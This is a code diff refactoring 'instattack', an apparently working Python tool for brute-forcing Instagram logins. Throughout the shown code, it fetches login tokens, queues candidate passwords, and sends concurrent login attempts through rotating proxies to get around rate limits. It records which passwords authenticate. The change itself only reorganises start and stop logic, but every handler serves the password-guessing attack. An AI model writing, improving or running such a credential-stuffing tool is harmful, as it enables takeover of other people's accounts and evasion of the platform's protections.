@@ -5,9 +5,7 @@ import aiohttp
 import random
 import stopit
 
-from instattack import settings, exceptions
-from instattack.progress import OptionalProgressbar
-from instattack.handlers import Handler
+from instattack import OptionalProgressbar, Handler, settings, exceptions
 from instattack.proxies.exceptions import NoProxyError
 
 from .models import InstagramResult, LoginAttemptContext, LoginContext
@@ -66,9 +64,13 @@ class ResultsHandler(Handler):
                     self.log.error("Not Authenticated", extra={'password': result.context.password})
                     await self.attempts.put(result.context.password)
 
+    async def stop(self, loop, save=True):
+        async with super(ResultsHandler, self).stop():
+            if save:
+                await self.dump(loop)
+
     async def dump(self, loop):
         attempts_list = []
-
         with self.log.start_and_done('Dumping Attempts'):
             while not self.attempts.empty():
                 attempts_list.append(await self.attempts.get())
@@ -115,14 +117,6 @@ class RequestHandler(Handler):
 
     @property
     def _connector(self):
-        """
-        TCPConnector
-        -------------
-        keepalive_timeout (float) – timeout for connection reusing after
-            releasing
-        limit_per_host (int) – limit simultaneous connections to the same
-            endpoint (default is 0)
-        """
         return aiohttp.TCPConnector(
             ssl=False,
             force_close=self._connection_force_close,
@@ -219,7 +213,11 @@ class TokenHandler(RequestHandler):
         # We might have to check if stop_event is set here.
         return await try_with_proxy()
 
-    async def consume(self, loop):
+    async def stop(self, loop):
+        async with super(TokenHandler, self).stop(loop):
+            await self.proxy_handler.stop(loop)
+
+    async def start(self, loop):
         """
         TODO:
         -----
@@ -227,12 +225,12 @@ class TokenHandler(RequestHandler):
         consume, since the fetch method is really what is consuming the
         proxies.
         """
-        try:
-            async with aiohttp.ClientSession(
-                connector=self._connector,
-                timeout=self._timeout
-            ) as session:
-                with self.log.start_and_done('Finding Token'):
+        with self.log.start_and_done('Finding Token'):
+            try:
+                async with aiohttp.ClientSession(
+                    connector=self._connector,
+                    timeout=self._timeout
+                ) as session:
                     task = asyncio.ensure_future(self.fetch(session))
 
                     with stopit.SignalTimeout(self._token_max_fetch_time) as timeout_mgr:
@@ -242,14 +240,15 @@ class TokenHandler(RequestHandler):
                             raise TokenHandlerException("Token should be non-null here.")
 
                         self.log.debug('Received Token')
-                        await self.proxy_handler.stop()
+                        await self.stop(loop)
                         return token
 
                     if timeout_mgr.state == timeout_mgr.TIMED_OUT:
                         raise exceptions.InternalTimeout(
                             self._token_max_fetch_time, "Waiting for token.")
-        except NoProxyError:
-            raise TokenHandlerException("Not enough allowable proxies to find token.")
+
+            except NoProxyError:
+                raise TokenHandlerException("Not enough allowable proxies to find token.")
 
 
 class PasswordHandler(RequestHandler):
@@ -335,23 +334,10 @@ class PasswordHandler(RequestHandler):
 
     async def fetch(self, session, parent_context):
         """
-        NOTE
-        ----
-
-        Do not want to automatically raise for status because we can have
-        a 400 error but enough info in response to authenticate.
-
-        Also, once response.raise_for_status() is called, we cannot access
-        the response.json().
-
         TODO:
         -----
-
-        Maybe incorporate some sort of max-retry on the attempts so that we dont
-        accidentally run into a situation of accumulating a lot of requests.
-
-        For certain exceptions we may want to reintroduce the sleep/timeout,
-        but it might be faster to immediately just go to next proxy.
+        We NEED TO incorporate updating the proxy models better to reflect errors
+        and things of that nature.
         """
         async def try_with_proxy(attempt=0):
             proxy = await self.proxy_handler.get()
@@ -447,7 +433,20 @@ class PasswordHandler(RequestHandler):
             for password in self.user.get_new_attempts(limit=password_limit):
                 await self.passwords.put(password)
 
-    async def consume(self, loop, found_result_event, token, results,
+    async def stop(self, loop, results, found_result_event):
+        async with super(PasswordHandler, self).stop(loop):
+
+            # Triggered by results handler if it notices an authenticated result.
+            if found_result_event.is_set():
+                # Here we might want to cancel outstanding tasks that we are awaiting.
+                self.log.debug('Stop Event Noticed')
+                await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
+            # Triggered by No More Passwords - No Authenticated Result
+            else:
+                await results.put(None)  # Stop Results Consumer
+                await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
+
+    async def start(self, loop, found_result_event, token, results,
             progress=False, password_limit=None):
         """
         A stop event is required since if the results handler notices that we
@@ -470,15 +469,11 @@ class PasswordHandler(RequestHandler):
             result = await res
             await self.results.put(result)
         """
-        tasks = []
         await self.prepopulate(loop, password_limit=password_limit)
 
         if self.passwords.qsize() == 0:
             self.log.error('No Passwords to Try')
-
-            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
-            await results.put(None)  # Stop Results Consumer
-            return
+            return await self.stop(loop, results, found_result_event)
 
         progress = OptionalProgressbar(label='Attempting Login', max_value=self.passwords.qsize())
 
@@ -491,13 +486,13 @@ class PasswordHandler(RequestHandler):
             progress.update()
             results.put_nowait(result)
 
+        tasks = []
         with self.log.start_and_done('Consuming Passwords'):
 
             async with aiohttp.ClientSession(
                 connector=self._connector,
                 timeout=self._timeout
             ) as session:
-
                 index = 0
                 while not self.passwords.empty() and not found_result_event.is_set():
                     password = await self.passwords.get()
@@ -511,14 +506,4 @@ class PasswordHandler(RequestHandler):
                 await asyncio.gather(*tasks)
 
         progress.finish()
-
-        # Triggered by results handler if it notices an authenticated result.
-        if found_result_event.is_set():
-            # Here we might want to cancel outstanding tasks that we are awaiting.
-            self.log.debug('Stop Event Noticed')
-            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
-
-        # Triggered by No More Passwords - No Authenticated Result
-        else:
-            await results.put(None)  # Stop Results Consumer
-            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
+        await self.stop(loop, results, found_result_event)
